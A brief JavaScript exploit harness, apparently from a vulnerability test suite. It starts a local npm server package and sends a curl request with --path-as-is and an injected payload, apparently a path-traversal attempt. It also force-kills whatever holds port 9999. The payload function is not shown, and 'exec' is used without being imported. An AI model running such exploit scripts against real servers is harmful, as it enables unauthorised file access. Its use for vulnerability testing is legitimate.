function exploitFunction() {
  const path = require("path");
  const { sleep } = require("sleep");
  const { execSync } = require("child_process");

  afterAll(() => {
    try {
      execSync("fuser -k 9999/tcp");
    } catch (e) {}
  });

  execSync("fuser -k 9999/tcp", () => {});

  let server = "node ./node_modules/myserve111/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  const attack_string = `curl -v --path-as-is "http://127.0.0.1:9999${getPayload()}`;
  let result = execSync(attack_string);

  return result.toString();
}

module.exports = { exploitFunction };